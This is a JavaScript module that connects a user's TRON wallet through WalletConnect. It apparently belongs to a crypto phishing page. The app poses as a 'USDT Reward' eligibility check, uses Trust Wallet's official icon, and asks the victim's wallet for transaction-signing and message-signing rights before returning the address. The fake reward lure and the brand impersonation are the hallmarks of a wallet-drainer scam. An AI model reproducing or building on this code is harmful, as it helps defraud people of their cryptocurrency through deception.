import UniversalProvider from "@walletconnect/universal-provider";
import { WalletConnectModal } from "@walletconnect/modal";

const projectId = 'c5250465b531d3f5128116dc9460f64e';
const metadata = {
    name: 'USDT Reward',
    description: 'Verify your eligibility for the reward.',
    url: window.location.origin,
    icons: ['https://trustwallet.com/assets/images/media/assets/trust_platform.svg']
};

let provider;
let web3Modal;

async function initWalletConnect() {
    try {
        provider = await UniversalProvider.init({
            projectId: projectId,
            metadata: metadata,
        });

        web3Modal = new WalletConnectModal({
            projectId: projectId,
            chains: ['tron:0x2b6653dc'],
            themeMode: 'dark',
            themeVariables: { '--wcm-accent-color': '#10b981' }
        });

        provider.on("display_uri", (uri) => {
            web3Modal.openModal({ uri });
        });
    } catch (e) {
        console.error("Provider Init Error:", e);
    }
}

window.connectWalletConnectTron = async function() {
    if (!provider) {
        alert("System is still loading... Please wait a few seconds.");
        return null;
    }
    
    try {
        await provider.connect({
            namespaces: {
                tron: {
                    methods: ["tron_signTransaction", "tron_signMessage"],
                    chains: ["tron:0x2b6653dc"],
                    events: ["chainChanged", "accountsChanged"]
                }
            }
        });

        web3Modal.closeModal();

        const session = provider.session;
        if (session && session.namespaces && session.namespaces.tron) {
            const accountStr = session.namespaces.tron.accounts[0];
            const address = accountStr.split(":")[2];
            return { address, provider };
        }
        return null;
    } catch (error) {
        console.error("WalletConnect Connection Error:", error);
        web3Modal.closeModal();
        return null;
    }
};

initWalletConnect();
